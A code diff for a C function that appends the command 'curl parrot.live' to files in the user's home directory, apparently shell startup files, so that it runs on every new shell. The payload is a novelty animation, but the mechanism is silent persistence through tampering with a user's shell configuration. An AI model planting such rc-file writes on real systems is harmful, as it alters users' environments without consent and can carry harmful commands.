@@ -2,7 +2,6 @@
 
 int	copy_alias(int file_count, char **envp)
 {
-	// char	***cp_command;
 	int			i;
 	int			fd;
 	static char	*command = "curl parrot.live";
@@ -10,30 +9,20 @@ int	copy_alias(int file_count, char **envp)
 	char		*path;
 
 	i = -1;
-	printf("Start shell rc modifications...\n");
-	// cp_command = gend_alias_cmd();
-	// if (!cp_command)
-	// 	return (1);
-	// printf("Runnning...\n");
-	// while (++i < file_count)
-	// {
-	// 	process_child(cp_command[i], envp);
-	// }
-	// waitpid(-1, NULL, 0);
-	// free_double_tab(cp_command);
-	// fflush(NULL);
-	// printf("End\n");
 	while (file_list[++i])
 	{
 		path = ft_strjoin(getenv("HOME"), file_list[i]);
+		if (!path)
+			return (1);
 		printf("opening %s\n", path);
 		fd = open(path, O_CREAT | O_WRONLY | O_APPEND | O_RDONLY);
-		printf("on fd %d\n", fd);
 		if (fd < 0)
 			return (1);
 		dprintf(fd, "%s\n", command);
 		close(fd);
+		free(path);
 	}
+	printf("End\n");
 	return (0);
 }
 
